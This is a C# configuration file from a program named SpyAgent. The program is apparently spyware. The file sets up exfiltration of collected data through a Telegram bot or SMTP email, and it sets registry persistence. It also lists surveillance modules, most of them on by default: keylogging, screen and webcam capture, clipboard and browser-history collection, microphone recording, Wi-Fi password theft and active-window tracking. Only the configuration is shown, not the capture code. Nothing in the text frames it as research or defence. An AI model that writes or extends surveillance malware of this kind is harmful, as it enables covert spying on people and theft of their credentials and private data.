namespace SpyAgent.Config;

using System.Text.Json;

internal sealed class SpyConfig
{
    public string ReportingMethod { get; init; } = "telegram";
    public string TelegramBotToken { get; init; } = "";
    public string TelegramChatId { get; init; } = "";
    public string SmtpServer { get; init; } = "smtp.gmail.com";
    public int SmtpPort { get; init; } = 587;
    public string EmailFrom { get; init; } = "";
    public string EmailTo { get; init; } = "";
    public string EmailPassword { get; init; } = "";
    public int ReportInterval { get; init; } = 3600;
    public string Persistence { get; init; } = "registry";
    public ModuleConfig Modules { get; init; } = new();

    public static SpyConfig Load(string[] args)
    {
        var configPath = GetConfigPath(args);

        if (File.Exists(configPath))
        {
            var json = File.ReadAllText(configPath);
            return JsonSerializer.Deserialize<SpyConfig>(json) ?? new SpyConfig();
        }

        return new SpyConfig
        {
            TelegramBotToken = Environment.GetEnvironmentVariable("SPY_TG_TOKEN") ?? "",
            TelegramChatId = Environment.GetEnvironmentVariable("SPY_TG_CHAT") ?? ""
        };
    }

    private static string GetConfigPath(string[] args)
    {
        for (int i = 0; i < args.Length - 1; i++)
        {
            if (args[i] == "--config")
                return args[i + 1];
        }
        return Path.Combine(AppContext.BaseDirectory, "config.json");
    }
}

internal sealed class ModuleConfig
{
    public ModuleEntry Keylogger { get; init; } = new() { Enabled = true, Interval = 300 };
    public ModuleEntry ScreenCapture { get; init; } = new() { Enabled = true, Interval = 60 };
    public ModuleEntry Webcam { get; init; } = new() { Enabled = false, Interval = 600 };
    public ModuleEntry Clipboard { get; init; } = new() { Enabled = true, Interval = 30 };
    public ModuleEntry BrowserHistory { get; init; } = new() { Enabled = true, Interval = 3600 };
    public MicrophoneEntry Microphone { get; init; } = new();
    public ModuleEntry WifiPasswords { get; init; } = new() { Enabled = true, Interval = 86400 };
    public ModuleEntry ActiveWindow { get; init; } = new() { Enabled = true, Interval = 5 };
}

internal sealed class ModuleEntry
{
    public bool Enabled { get; init; }
    public int Interval { get; init; } = 60;
}

internal sealed class MicrophoneEntry
{
    public bool Enabled { get; init; }
    public int Duration { get; init; } = 30;
}
